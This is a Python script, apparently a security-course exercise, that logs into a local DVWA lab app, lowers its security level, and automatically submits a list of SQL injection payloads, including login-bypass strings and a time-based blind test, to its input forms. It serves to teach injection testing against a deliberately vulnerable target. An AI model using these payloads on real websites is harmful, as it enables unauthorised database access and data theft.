#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - Install a vulnerable web application such as DVWA, OWASP Web Goat or other
# - Use mechanize to try SQL Injection on form fields and deduce which fields are vulnerable to SQL Injection

import mechanicalsoup
import time

sql_injections = [
    '1',
    "1 ' OR 1=1",
    "admin' --", 
    "admin' #", 
    "admin'/*",
    "' OR 1=1--", 
    "' OR 1=1#", 
    "' OR 1=1/*", 
    "') OR '1'='1--", 
    "') OR ('1'='1--"
]

blind_sql_injections = [
    '1',
    '1 AND SLEEP 10',
]


def dvwa_login():
    br.open('http://spse_dvwa_1/')
    # Login
    br.select_form(nr=0)
    br['username'] = "admin"
    br['password'] = "password"
    br.submit_selected()


def dvwa_lower_security():
    global dvwa_sqli_url, dvwa_blind_sqli_url
    br.follow_link(br.find_link(text='DVWA Security'))
    br.select_form(nr=0)
    br['security'] = "low"
    br.submit_selected()
    br.follow_link(br.find_link(text='SQL Injection'))
    dvwa_sqli_url = br.get_url()
    print("Sql injection url: ", dvwa_sqli_url)
    br.follow_link(br.find_link(text='SQL Injection (Blind)'))
    dvwa_blind_sqli_url = br.get_url()
    print("Blind Sql injection url: ", dvwa_blind_sqli_url)


def handle_sqli():
    field_name = 'id'
    # Switch to sql injection section
    print("Sql injection in progress: ", dvwa_sqli_url)
    for sqli in sql_injections:
        print('Testing: ', dvwa_sqli_url, ' with payload: ', sqli)
        br.open(dvwa_sqli_url)    
        br.select_form(nr=0)
        br[field_name] = sqli
        br.submit_selected()
        htmlresult = br.get_current_page()
    
        # parse the results of the SQL Query with the BeatifulSoup	
        dbResults = htmlresult.find_all('pre')
        for record in dbResults:
            if record is not None:
                print(record)
        print('\n')


def handle_blind_sqli():
    field_name = 'id'
    # Switch to blind sql injection section
    br.open(dvwa_blind_sqli_url)
    print("Blind Sql injection in progress: ", dvwa_blind_sqli_url)
    for blind_sqli in blind_sql_injections:
        start_time = time.time()
        print('Testing: ', dvwa_blind_sqli_url, ' with payload: ', blind_sqli)
        br.open(dvwa_blind_sqli_url)    
        br.select_form(nr=0)
        br[field_name] = blind_sqli
        br.submit_selected()
        htmlresult = br.get_current_page()
    
        # parse the results of the SQL Query with the BeatifulSoup	
        dbResults = htmlresult.find_all('pre')
        for record in dbResults:
            if record is not None:
                print(record)
        print('\n')
        elapsed_time = time.time() - start_time
        if elapsed_time >= 9:
            print('Host seem to be vulnerable')
        else:
            print('Host doesn\'t to be vulnerable')


br = mechanicalsoup.StatefulBrowser()
dvwa_sqli_url = ''
dvwa_blind_sqli_url = ''

dvwa_login()
dvwa_lower_security()

handle_sqli()
handle_blind_sqli()